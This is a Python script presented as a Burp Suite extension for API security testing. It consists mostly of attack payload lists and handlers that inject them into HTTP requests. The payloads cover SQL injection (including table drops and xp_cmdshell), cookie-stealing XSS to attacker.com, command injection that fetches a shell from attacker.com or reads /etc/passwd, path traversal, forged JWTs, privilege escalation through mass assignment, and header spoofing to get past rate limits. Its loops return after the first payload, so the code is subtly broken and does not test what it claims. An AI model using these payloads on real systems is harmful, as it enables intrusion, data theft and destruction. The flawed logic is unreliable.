#!/usr/bin/env python3
"""
API Security Testing Bambda
Comprehensive API security testing with various attack vectors
"""

import json
import base64
import hashlib
import hmac
import time
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode

class APISecurityTester:
    """Comprehensive API security testing class"""
    
    def __init__(self):
        self.api_key_payloads = [
            "null", "undefined", "test", "admin", "123456", "api_key", "key",
            "Bearer null", "Bearer undefined", "Bearer test", "Bearer admin",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
        ]
        
        self.sql_injection_payloads = [
            "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
            "' UNION SELECT NULL--", "admin'--", "1' AND '1'='1",
            "' UNION SELECT username,password FROM users--",
            "' OR 1=1 LIMIT 1--", "' OR 'x'='x", "'; EXEC xp_cmdshell('dir')--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')", "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>", "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//", "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
        ]
        
        self.no_sql_injection_payloads = [
            '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
            '{"$regex": ".*"}', '{"$exists": true}', '{"$in": ["admin"]}',
            '{"$or": [{"admin": true}]}', '{"$and": [{"admin": true}]}'
        ]
        
        self.command_injection_payloads = [
            "; ls -la", "| ls", "& dir", "`whoami`", "$(id)",
            "; cat /etc/passwd", "| cat /etc/passwd", "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "; wget http://attacker.com/shell", "| curl http://attacker.com/shell"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252F..%252F..%252Fetc%252Fpasswd"
        ]

    def lambda_handler_authentication_bypass(self, request):
        """Test API authentication bypass vulnerabilities"""
        
        # Get request headers
        headers = request.headers.copy()
        
        # Test various authentication bypass techniques
        auth_headers = [
            "Authorization", "X-API-Key", "X-Auth-Token", "X-Access-Token",
            "X-Token", "API-Key", "Auth-Token", "Bearer"
        ]
        
        for header_name in auth_headers:
            for payload in self.api_key_payloads:
                headers[header_name] = payload
                request.headers = headers
                
                # Also test with different header variations
                if header_name == "Authorization":
                    headers["X-Forwarded-User"] = "admin"
                    headers["X-Forwarded-Email"] = "admin@example.com"
                    headers["X-Forwarded-Groups"] = "admin,user"
                
                request.headers = headers
                return request
        
        return request

    def lambda_handler_sql_injection(self, request):
        """Test SQL injection vulnerabilities in API parameters"""
        
        # Get request parameters
        params = request.parameters.copy()
        
        # Test each parameter with SQL injection payloads
        for param_name, param_value in params.items():
            if param_name.lower() in ["id", "user", "search", "query", "input", "filter", "sort"]:
                for payload in self.sql_injection_payloads:
                    params[param_name] = payload
                    request.parameters = params
                    return request
        
        # Also test in request body for POST requests
        if request.method.upper() == "POST":
            try:
                body = json.loads(request.body)
                for key in body:
                    if isinstance(body[key], str) and key.lower() in ["id", "user", "search", "query"]:
                        for payload in self.sql_injection_payloads:
                            body[key] = payload
                            request.body = json.dumps(body)
                            return request
            except (json.JSONDecodeError, AttributeError):
                pass
        
        return request

    def lambda_handler_xss_api(self, request):
        """Test XSS vulnerabilities in API responses"""
        
        # Get request parameters
        params = request.parameters.copy()
        
        # Test each parameter with XSS payloads
        for param_name, param_value in params.items():
            if param_name.lower() in ["search", "q", "query", "input", "param", "name", "title"]:
                for payload in self.xss_payloads:
                    params[param_name] = payload
                    request.parameters = params
                    return request
        
        # Test in request body
        if request.method.upper() in ["POST", "PUT", "PATCH"]:
            try:
                body = json.loads(request.body)
                for key in body:
                    if isinstance(body[key], str) and key.lower() in ["name", "title", "description", "content"]:
                        for payload in self.xss_payloads:
                            body[key] = payload
                            request.body = json.dumps(body)
                            return request
            except (json.JSONDecodeError, AttributeError):
                pass
        
        return request

    def lambda_handler_no_sql_injection(self, request):
        """Test NoSQL injection vulnerabilities"""
        
        # Test in request body for JSON APIs
        if request.method.upper() in ["POST", "PUT", "PATCH"]:
            try:
                body = json.loads(request.body)
                for key in body:
                    if isinstance(body[key], str) and key.lower() in ["id", "user", "email", "username"]:
                        for payload in self.no_sql_injection_payloads:
                            try:
                                payload_obj = json.loads(payload)
                                body[key] = payload_obj
                                request.body = json.dumps(body)
                                return request
                            except json.JSONDecodeError:
                                continue
            except (json.JSONDecodeError, AttributeError):
                pass
        
        return request

    def lambda_handler_command_injection(self, request):
        """Test command injection vulnerabilities"""
        
        # Get request parameters
        params = request.parameters.copy()
        
        # Test each parameter with command injection payloads
        for param_name, param_value in params.items():
            if param_name.lower() in ["cmd", "command", "exec", "system", "shell"]:
                for payload in self.command_injection_payloads:
                    params[param_name] = payload
                    request.parameters = params
                    return request
        
        # Test in request body
        if request.method.upper() in ["POST", "PUT", "PATCH"]:
            try:
                body = json.loads(request.body)
                for key in body:
                    if isinstance(body[key], str) and key.lower() in ["cmd", "command", "exec", "system"]:
                        for payload in self.command_injection_payloads:
                            body[key] = payload
                            request.body = json.dumps(body)
                            return request
            except (json.JSONDecodeError, AttributeError):
                pass
        
        return request

    def lambda_handler_path_traversal_api(self, request):
        """Test path traversal vulnerabilities in API endpoints"""
        
        # Get request parameters
        params = request.parameters.copy()
        
        # Test each parameter with path traversal payloads
        for param_name, param_value in params.items():
            if param_name.lower() in ["file", "path", "include", "page", "doc", "template"]:
                for payload in self.path_traversal_payloads:
                    params[param_name] = payload
                    request.parameters = params
                    return request
        
        # Test in request body
        if request.method.upper() in ["POST", "PUT", "PATCH"]:
            try:
                body = json.loads(request.body)
                for key in body:
                    if isinstance(body[key], str) and key.lower() in ["file", "path", "template"]:
                        for payload in self.path_traversal_payloads:
                            body[key] = payload
                            request.body = json.dumps(body)
                            return request
            except (json.JSONDecodeError, AttributeError):
                pass
        
        return request

    def lambda_handler_mass_assignment(self, request):
        """Test mass assignment vulnerabilities"""
        
        mass_assignment_payloads = [
            {"role": "admin"}, {"is_admin": True}, {"admin": True},
            {"isAdmin": True}, {"user_role": "admin"}, {"role_id": 1},
            {"roleId": 1}, {"permissions": ["admin", "user"]},
            {"access_level": "admin"}, {"accessLevel": "admin"},
            {"active": True}, {"enabled": True}, {"verified": True},
            {"email_verified": True}, {"emailVerified": True},
            {"status": "active"}, {"account_status": "active"},
            {"is_superuser": True}, {"isSuperuser": True},
            {"superuser": True}, {"privileges": ["read", "write", "admin"]},
            {"capabilities": ["admin"]}, {"premium": True},
            {"is_premium": True}, {"subscription": "premium"},
            {"plan": "premium"}, {"billing_tier": "premium"},
            {"payment_status": "paid"}, {"id": 1}, {"user_id": 1},
            {"userId": 1}, {"account_id": 1}, {"accountId": 1}
        ]
        
        # Test in request body
        if request.method.upper() in ["POST", "PUT", "PATCH"]:
            try:
                body = json.loads(request.body)
                for payload in mass_assignment_payloads:
                    new_body = {**body, **payload}
                    request.body = json.dumps(new_body)
                    return request
            except (json.JSONDecodeError, AttributeError):
                pass
        
        return request

    def lambda_handler_rate_limiting_bypass(self, request):
        """Test rate limiting bypass techniques"""
        
        # Get request headers
        headers = request.headers.copy()
        
        # Rate limiting bypass headers
        bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Forwarded-For": "10.0.0.1"},
            {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
            {"User-Agent": "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"},
            {"User-Agent": "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Requested-With": "Fetch"},
            {"Accept": "application/json"},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
        ]
        
        for bypass_header in bypass_headers:
            headers.update(bypass_header)
            request.headers = headers
            return request
        
        return request

    def lambda_handler_jwt_attacks(self, request):
        """Test JWT token vulnerabilities"""
        
        # Get request headers
        headers = request.headers.copy()
        
        # JWT attack payloads
        jwt_payloads = [
            # None algorithm
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYxNjE2MjAwMCwiZXhwIjoxNjE2MTY1NjAwfQ.",
            # Empty signature
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.",
            # Weak secret
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.weak_secret",
            # Modified payload
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.signature"
        ]
        
        for payload in jwt_payloads:
            headers["Authorization"] = f"Bearer {payload}"
            request.headers = headers
            return request
        
        return request

    def lambda_handler_api_version_bypass(self, request):
        """Test API version bypass techniques"""
        
        # Get request URL
        url = request.url
        
        # API version bypass techniques
        version_bypasses = [
            "/api/v1/", "/api/v2/", "/api/latest/", "/api/",
            "/rest/v1/", "/rest/v2/", "/rest/latest/", "/rest/",
            "/v1/", "/v2/", "/latest/", "/"
        ]
        
        for bypass in version_bypasses:
            if "/api/" in url:
                new_url = url.replace("/api/v1/", bypass).replace("/api/v2/", bypass)
                request.url = new_url
                return request
            elif "/rest/" in url:
                new_url = url.replace("/rest/v1/", bypass).replace("/rest/v2/", bypass)
                request.url = new_url
                return request
        
        return request

    def lambda_handler_content_type_bypass(self, request):
        """Test content type bypass techniques"""
        
        # Get request headers
        headers = request.headers.copy()
        
        # Content type bypass techniques
        content_type_bypasses = [
            {"Content-Type": "application/json"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Content-Type": "text/plain"},
            {"Content-Type": "application/xml"},
            {"Content-Type": "multipart/form-data"},
            {"Accept": "application/json"},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Requested-With": "Fetch"}
        ]
        
        for bypass in content_type_bypasses:
            headers.update(bypass)
            request.headers = headers
            return request
        
        return request

# Main handler function
def main(request):
    """
    Main handler that applies all API security testing modifications
    
    Args:
        request: The HTTP request object
        
    Returns:
        Modified request object
    """
    
    tester = APISecurityTester()
    
    # Apply authentication bypass testing
    request = tester.lambda_handler_authentication_bypass(request)
    
    # Apply SQL injection testing
    request = tester.lambda_handler_sql_injection(request)
    
    # Apply XSS testing
    request = tester.lambda_handler_xss_api(request)
    
    # Apply NoSQL injection testing
    request = tester.lambda_handler_no_sql_injection(request)
    
    # Apply command injection testing
    request = tester.lambda_handler_command_injection(request)
    
    # Apply path traversal testing
    request = tester.lambda_handler_path_traversal_api(request)
    
    # Apply mass assignment testing
    request = tester.lambda_handler_mass_assignment(request)
    
    # Apply rate limiting bypass testing
    request = tester.lambda_handler_rate_limiting_bypass(request)
    
    # Apply JWT attack testing
    request = tester.lambda_handler_jwt_attacks(request)
    
    # Apply API version bypass testing
    request = tester.lambda_handler_api_version_bypass(request)
    
    # Apply content type bypass testing
    request = tester.lambda_handler_content_type_bypass(request)
    
    return request


if __name__ == "__main__":
    print("API Security Testing Bambda")
    print("This script performs comprehensive API security testing")
    print("Load this script in Burp Suite's Bambda interface") 